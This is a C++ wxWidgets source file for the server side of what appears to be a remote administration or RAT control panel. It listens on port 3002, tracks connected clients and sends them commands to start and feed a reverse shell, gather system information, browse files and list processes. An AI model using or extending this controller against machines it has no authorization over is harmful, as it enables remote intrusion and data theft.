#include "NetServerService.h"
#include "../concurrent/events/ClientAppEvent.h"
#include "../../../shared/NetLib/PacketShell.h"
#include "../../../shared/NetLib/packets/PacketInformation.h"
#include "../../../shared/NetLib/packets/PacketFileSystem.h"
#include "../../../shared/NetLib/packets/PacketProcess.h"

wxDECLARE_EVENT(ServerId, wxSocketEvent);
wxDEFINE_EVENT(ServerId, wxSocketEvent);

wxBEGIN_EVENT_TABLE(NetServerService, wxEvtHandler)
		EVT_SOCKET(ServerId, NetServerService::OnServerEvent)
wxEND_EVENT_TABLE()

NetServerService::NetServerService()
{
}


NetServerService::~NetServerService()
{
}

void NetServerService::setChannel(const wxSharedPtr<NetAppEventDoubleQueueThreadChannel>& channel)
{
	this->channel = channel;
}

void NetServerService::runAsync()
{
	running = true;
	listenAppEventsThreads = new ThreadRunnableRunner<NetServerService>(
		std::bind(&NetServerService::listenAppEvents, this));

	listenAppEventsThreads->Create();
	listenAppEventsThreads->Run();
	// TODO: dynamically pass the port
	addr.Service(3002);

	// Create the socket, this SHOULD BE RUN ON MAIN THREAD
	serverSocket = new wxSocketServer(addr);

	// We use IsOk() here to see if the runnable is really listening
	if (!serverSocket->IsOk())
	{
		channel->submitToApp(wxSharedPtr<AppEvent>(new AppEvent(Target::Server,
		                                                        Subject::Connection,
		                                                        wxString::Format(
			                                                        "[-] Error on trying to listen on binding to address: %s: %d\n",
			                                                        addr.IPAddress(),
			                                                        3002))));
		return;
	}
	else
	{
		channel->submitToApp(wxSharedPtr<AppEvent>(
			new AppEvent(Target::Server,
			             Subject::Connection,
			             wxString::Format("Server is listening incomming connections at %s:%d\n",
			                              addr.IPAddress(),
			                              3002))));
	}

	wxIPV4address addrReal;
	if (!serverSocket->GetLocal(addrReal))
	{
		wxLogMessage("ERROR: couldn't get the address we bound to");
	}
	else
	{
		// wxLogMessage("Server listening at %s:%u",addrReal.IPAddress(), addrReal.Service());
	}

	// Setup the event handler and subscribe to connection events
	serverSocket->SetEventHandler(*this, ServerId);
	serverSocket->SetNotify(wxSOCKET_CONNECTION_FLAG);
	serverSocket->Notify(true);
}

void NetServerService::OnServerEvent(wxSocketEvent& event)
{
	switch (event.GetSocketEvent())
	{
	case wxSOCKET_CONNECTION:

		break;
	default:
		wxString::Format("Unknown socket event: %d\n", event.GetSocketEvent());
		break;
	}


	// Accept new connection if there is one in the pending
	// connections queue, else exit. We use Accept(false) for
	// non-blocking accept (although if we got here, there
	// should ALWAYS be a pending connection).

	wxSocketBase* sock = serverSocket->Accept(false);

	if (sock)
	{
		wxIPV4address addr;


		if (sock->GetPeer(addr))
		{
			wxString::Format("New connection with Socket descriptor: %s\n", addr.IPAddress());

			auto client = wxSharedPtr<NetClientService>(new NetClientService(this, sock));
			wxMutexError error = clientsMutex.LockTimeout(15 * 1000);
			if (error != wxMUTEX_NO_ERROR)
			{
				wxLogMessage("Could not Lock the ClientsMutex on NetServerService::OnServerEvent");
			}
			clients.insert(Clients_wxImplementation_Pair(sock->GetSocket(), client));
			clientsMutex.Unlock();

			client->interactAsync();
			// wxLogMessage("New connection from unknown client accepted.");
		}
		else
		{
			wxLogMessage("New client connection from %netServerService:%u accepted",
			             addr.IPAddress(), addr.Service());
		}
	}
	else
	{
		wxLogMessage("Error: couldn't accept a new connection");
		return;
	}
}

void NetServerService::onPacketReceived(const wxSharedPtr<Client>& client, const std::shared_ptr<Packet>& packet)
{
	const wxSharedPtr<AppEvent> event = wxSharedPtr<AppEvent>(
		new ClientAppEvent(Subject::PacketReceived, client,
		                   packet));

	channel->submitToApp(event);
}

wxSharedPtr<NetServerService> NetServerService::createInstance()
{
	return wxSharedPtr<NetServerService>(new NetServerService);
}

std::vector<wxSharedPtr<Client>> NetServerService::getClients()
{
	std::vector<wxSharedPtr<Client>> onlineClients;

	{
		// TODO: Lock clients

		for (auto&& clientPair : clients)
		{
			wxSharedPtr<Client> onlineClient = clientPair.second->client;
			onlineClients.push_back(onlineClient);
		}
	}

	return onlineClients;
}


void NetServerService::listenAppEvents()
{
	while (running)
	{
		wxSharedPtr<AppEvent> appEvent = channel->takeFromApp();
		if (appEvent == nullptr)
		{
			std::cout << "AppEvent is null" << std::endl;
			return;
		}

		Target target = appEvent->target;
		Subject subject = appEvent->subject;
		// wxSharedPtr<void> object = netEvent->object;
		Action action = appEvent->action;
		std::shared_ptr<void> data = appEvent->object;

		if (target == Target::Server)
		{
			if (subject == Subject::Connection)
			{
				if (action == Action::ListAvailable)
				{
					const std::shared_ptr<void> clientsLive =
						std::make_shared<std::vector<wxSharedPtr<Client>>>(getClients());

					appEvent->object = clientsLive;
					channel->submitToApp(appEvent);
				}
			}
		}
		else if (target == Target::Client)
		{
			wxSharedPtr<Client> client = ((ClientAppEvent*)appEvent.get())->client;
			if (client == nullptr)
			{
				std::cout << "nullptr client NetServerService" << std::endl;
				std::cout << "Action " << (int)action << " Subject " << (int)subject << std::endl;
				return;
			}
			wxSharedPtr<NetClientService> clientService = clients[client->clientId];

			if (subject == Subject::ReverseShell)
			{
				if (action == Action::Start)
				{
					std::shared_ptr<PacketShell> packet = std::make_shared<PacketShell>(
						ShellAction::Start, "");
					clientService->sendPacket(packet);
				}
				else if (action == Action::Push)
				{
					std::shared_ptr<PacketShell> packet = std::make_shared<PacketShell>(
						ShellAction::Push, *(wxString*)data.get());
					clientService->sendPacket(packet);
				}
				else if (action == Action::Stop)
				{
					std::shared_ptr<PacketShell> packet = std::make_shared<PacketShell>(
						ShellAction::Stop, "");
					clientService->sendPacket(packet);
				}
			}
			else if (subject == Subject::Information)
			{
				if (action == Action::Start)
				{
					std::shared_ptr<PacketInformation> packet = std::make_shared<PacketInformation>();
					clientService->sendPacket(packet);
				}
			}
			else if (subject == Subject::FileSystem)
			{
				if (action == Action::Fetch)
				{
					std::shared_ptr<PacketFileSystem> packet = std::make_shared<PacketFileSystem>();
					wxString* path = (wxString*)data.get();
					packet->path = *path;
					clientService->sendPacket(packet);
				}
			}
			else if (subject == Subject::Process)
			{
				if (action == Action::Fetch)
				{
					std::shared_ptr<PacketProcess> packet = std::make_shared<PacketProcess>();
					clientService->sendPacket(packet);
				}
			}
		}
	}
}
